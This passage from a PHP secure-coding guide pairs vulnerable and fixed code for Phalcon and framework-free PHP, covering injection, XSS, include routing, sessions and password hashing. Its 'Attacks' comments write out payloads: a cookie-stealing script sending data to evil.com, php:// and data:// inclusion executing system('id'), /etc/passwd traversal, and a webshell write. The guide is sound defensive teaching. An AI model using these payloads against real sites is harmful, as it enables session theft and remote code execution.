```

---

### PHQL Injection

**Vulnerable pattern:**

```php
// PHQL (Phalcon's query language) with string interpolation
$id = $request->getQuery('id');
$phql = "SELECT * FROM Users WHERE id = $id";
$result = $modelsManager->executeQuery($phql);

// Phalcon also supports raw SQL via the DB adapter:
$result = $db->query("SELECT * FROM users WHERE id = " . $id);
```

**Why it fails:**

PHQL is Phalcon's own SQL-like query language, translated to database-specific SQL. While it restricts some SQL features (no multi-statement execution, no `DROP TABLE`), it has its own injection surface via string interpolation. Logical conditions (`1 OR 1=1`) and subqueries are injectable through PHQL just as in raw SQL.

**Fixed pattern:**

```php
// Use bound parameters in PHQL
$result = $modelsManager->executeQuery(
    'SELECT * FROM Users WHERE id = :id:',
    ['id' => $id]
);

// For raw DB queries: use placeholders
$result = $db->query(
    'SELECT * FROM users WHERE id = ?',
    [$id]
);
```

---

### bcrypt Cost Factor

**Vulnerable pattern:**

```php
// Using Phalcon's Security component with default or low cost
$security = new \Phalcon\Security();
$security->setWorkFactor(8);  // Phalcon default is 8
$hash = $security->hash($password);
```

**Why it fails:**

A bcrypt cost factor of 8 is too low for current hardware. The recommended minimum is 12 for most applications. Phalcon's `Security::hash()` uses bcrypt, and the work factor defaults to 8 in older versions. Passwords hashed with cost 8 can be brute-forced significantly faster than those hashed with cost 12ÔÇô14.

**Fixed pattern:**

```php
$security = new \Phalcon\Security();
$security->setWorkFactor(12);  // increase cost; benchmark: ~250ms per hash on your hardware
$hash = $security->hash($password);

// Verification
if ($security->checkHash($password, $storedHash)) {
    // authenticated

    // Optionally re-hash if cost factor has been increased
    if ($security->checkHash($password, $storedHash) &&
        password_get_info($storedHash)['options']['cost'] < 12) {
        $newHash = $security->hash($password);
        // save $newHash
    }
}
```

---

### User-Controlled Cache Keys

**Vulnerable pattern:**

```volt
{# Volt template caching with user-controlled key #}
{% cache user.id %}
    {{ user.profile }}
{% endcache %}

{# If user.id is attacker-controlled, the attacker can poison other users' cache entries #}
```

**Why it fails:**

Cache keys derived from user input can be manipulated. An attacker who can set `user.id` to a value corresponding to another user's cache key can read that user's cached content (cache poisoning for data theft) or overwrite it with attacker-supplied content (cache poisoning for stored XSS or misinformation).

**Fixed pattern:**

```php
// Generate cache keys from server-side data only
$cacheKey = 'user_profile_' . $this->auth->getUserId();  // from session, not request
$cache->set($cacheKey, $profileData, 3600);

// If cache keys must include request parameters, hash them with a secret prefix
$cacheKey = 'page_' . hash_hmac('sha256', $requestUri, $appSecret);
```

---

## 7. Pure PHP (No Framework)

> **Applies to:** PHP files with direct use of `$_GET`, `$_POST`, `$_COOKIE`, and `$_SESSION` without a framework.
> **Quick detect:**
> ```bash
> grep -r '\$_POST\|\$_GET\|\$_REQUEST' *.php --include='*.php' | head -20
> # Large numbers of direct superglobal accesses without a framework autoloader
> ```
> **Using a framework?** Jump to its section above.

> These sites often carry the oldest vulnerabilities because they predate framework conventions. The items here overlap with [Universal PHP Security](#1-universal-php-security) but with concrete no-framework examples.

---

### HTML Templating by String Concatenation

**Vulnerable pattern:**

```php
// Building HTML by concatenating user input directly
echo '<div class="username">' . $_GET['name'] . '</div>';
echo '<p>Welcome back, ' . $row['username'] . '!</p>';
echo '<input value="' . $_POST['search'] . '">';

// Attacker: ?name=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

**Why it fails:**

Every unescaped variable in an HTML context is potential XSS. In no-framework PHP, this is the dominant vulnerability because there is no templating layer that escapes by default.

**Fixed pattern:**

```php
// Define a helper function and use it everywhere
function h(mixed $value): string {
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

echo '<div class="username">' . h($_GET['name']) . '</div>';
echo '<p>Welcome back, ' . h($row['username']) . '!</p>';
echo '<input value="' . h($_POST['search']) . '">';

// In a JavaScript context: JSON encode, never concatenate
echo '<script>var username = ' . json_encode($row['username']) . ';</script>';
```

---

### include Routing

**Vulnerable pattern:**

```php
// index.php ÔÇö routing by GET parameter
$page = $_GET['page'];
include($page . '.php');

// Or with "safety" measures that are insufficient:
$page = basename($_GET['page']);  // strips path separators ÔÇö but not enough
include('pages/' . $page . '.php');

// Attacks:
// ?page=../config             ÔåÆ includes config.php (path traversal)
// ?page=php://input           ÔåÆ includes and executes POST body as PHP
// ?page=data://text/plain,<?php system('id'); ?>&   ÔåÆ data: URI execution
// ?page=/proc/self/environ    ÔåÆ if log poisoning has worked
```

**Why it fails:**

Path traversal allows inclusion of any file the PHP process can read. PHP stream wrappers (`php://`, `data://`, `http://`, `zip://`) can be used as file paths if not explicitly blocked.

**Fixed pattern:**

```php
$allowedPages = ['home', 'about', 'contact', 'products'];
$page = $_GET['page'] ?? 'home';

// Strict allowlist: only listed page names are ever included
if (!in_array($page, $allowedPages, true)) {
    $page = 'home';
}

// Use a fixed base directory and verify the resolved path
$base = realpath(__DIR__ . '/pages') . '/';
$file = realpath($base . $page . '.php');

if ($file === false || strpos($file, $base) !== 0) {
    // Resolved path escaped the pages/ directory
    die('Invalid page');
}

include $file;
```

---

### Manual Session Handling

**Vulnerable pattern:**

```php
// Session fixation: not regenerating ID on login
session_start();
if (verify_credentials($_POST['user'], $_POST['pass'])) {
    $_SESSION['user_id'] = get_user_id($_POST['user']);
    // Session ID is the same before and after login
    // An attacker who set the session ID via URL can now use it
}

// Session without secure cookie flags:
// php.ini: session.cookie_httponly = 0
// php.ini: session.cookie_secure = 0
```

**Fixed pattern:**

```php
// Secure session configuration ÔÇö set before session_start()
ini_set('session.use_only_cookies', 1);
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);   // requires HTTPS
ini_set('session.cookie_samesite', 'Lax');
ini_set('session.gc_maxlifetime', 1800);  // 30-minute idle timeout

session_start();

// On login: regenerate session ID to prevent fixation
if (verify_credentials($_POST['user'], $_POST['pass'])) {
    session_regenerate_id(true);  // true = delete old session data
    $_SESSION['user_id'] = get_user_id($_POST['user']);
    $_SESSION['last_activity'] = time();
}

// On every request: enforce idle timeout
if (isset($_SESSION['last_activity']) &&
    (time() - $_SESSION['last_activity']) > 1800) {
    session_destroy();
    header('Location: /login?timeout=1');
    exit;
}
$_SESSION['last_activity'] = time();
```

---

### Prepared Statement Patterns

**Vulnerable pattern:**

```php
// PDO without disabling emulated prepares
$pdo = new PDO('mysql:host=localhost;dbname=app', $user, $pass);
// Default: PDO::ATTR_EMULATE_PREPARES = true on MySQL driver
// Emulated prepares do client-side escaping, not real server-side binding
// Bypasses are possible with unusual character sets
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute([':id' => $_GET['id']]);

// mysqli with incorrectly typed binding:
$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');
$stmt->bind_param('s', $_GET['id']);  // 's' = string ÔÇö should be 'i' for integer
// Not a security hole, but means an integer column gets a string comparison
```

**Fixed pattern:**

```php
// PDO: disable emulated prepares for real server-side binding
$pdo = new PDO(
    'mysql:host=localhost;dbname=app;charset=utf8mb4',
    $user,
    $pass,
    [
        PDO::ATTR_EMULATE_PREPARES   => false,  // real server-side prepared statements
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]
);
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute([':id' => (int)$_GET['id']]);
$user = $stmt->fetch();

// mysqli prepared statements:
$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');
$id = (int)$_GET['id'];
$stmt->bind_param('i', $id);  // 'i' = integer
$stmt->execute();
$result = $stmt->get_result();
```

---

### Password Hashing

**Vulnerable pattern:**

```php
// All of these are wrong for password storage:
$hash = md5($password);
$hash = sha1($password);
$hash = sha256($password);
$hash = md5($password . $salt);
$hash = sha1($salt . $password . $salt);
$hash = crypt($password);        // crypt() with no explicit algorithm uses DES ÔÇö 8-char limit
$hash = crypt($password, $salt); // only safe if salt starts with '$2y$' (bcrypt)
```

**Why it fails:**

All fast hash functions (MD5, SHA-1, SHA-256) are wrong for passwords regardless of salting, because modern hardware can compute billions per second. `crypt()` with a non-bcrypt salt uses weak algorithms. Even `crypt($pass, '$1$' . $salt)` uses MD5-crypt, which is too fast.

**Fixed pattern:**

```php
// PHP 5.5+: password_hash() / password_verify()
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verification ÔÇö also checks if rehashing is needed
function verify_and_rehash(string $password, string $hash, PDO $db, int $userId): bool {
    if (!password_verify($password, $hash)) {
        return false;
    }
    if (password_needs_rehash($hash, PASSWORD_BCRYPT, ['cost' => 12])) {
        $newHash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
        $stmt = $db->prepare('UPDATE users SET password = ? WHERE id = ?');
        $stmt->execute([$newHash, $userId]);
    }
    return true;
}
```

---

### Direct File Operations

**Vulnerable pattern:**

```php
// Reading a user-requested file
$file = $_GET['file'];
$content = file_get_contents('uploads/' . $file);
echo $content;

// Downloading a file
header('Content-Disposition: attachment; filename="' . $file . '"');
readfile('files/' . $_GET['name']);

// Writing to a file with user-supplied content
file_put_contents('logs/' . $_GET['filename'], $_POST['data']);

// Attacks:
// ?file=../config.php            ÔåÆ reads application config
// ?file=../../../etc/passwd      ÔåÆ reads system files
// ?name=../../wp-config.php      ÔåÆ path traversal to WP config
// filename=../../cron.php&data=<?php system($_GET['cmd']); ?>  ÔåÆ webshell
```

**Fixed pattern:**

```php
// Validate filename: alphanumeric, dashes, underscores, single extension only
function validate_filename(string $filename, string $allowedExt): string {
    $basename = basename($filename);
    if (!preg_match('/^[a-zA-Z0-9_\-]+\.' . preg_quote($allowedExt, '/') . '$/', $basename)) {
        throw new InvalidArgumentException('Invalid filename');
    }
    return $basename;
}

// Validate path stays within allowed directory
function safe_file_path(string $base, string $filename): string {
    $base    = rtrim(realpath($base), '/') . '/';
    $full    = realpath($base . $filename);

    if ($full === false || strpos($full, $base) !== 0) {
        throw new RuntimeException('Path traversal detected');
    }
    return $full;
}

// Usage:
$filename = validate_filename($_GET['file'], 'jpg');
$path     = safe_file_path('/var/uploads/', $filename);
readfile($path);
```

---

*Last reviewed: 2025 | Applies to: PHP 5.x, PHP 7.x, PHP 8.x ÔÇö Laravel, Symfony, CodeIgniter, Phalcon, and pure PHP applications*
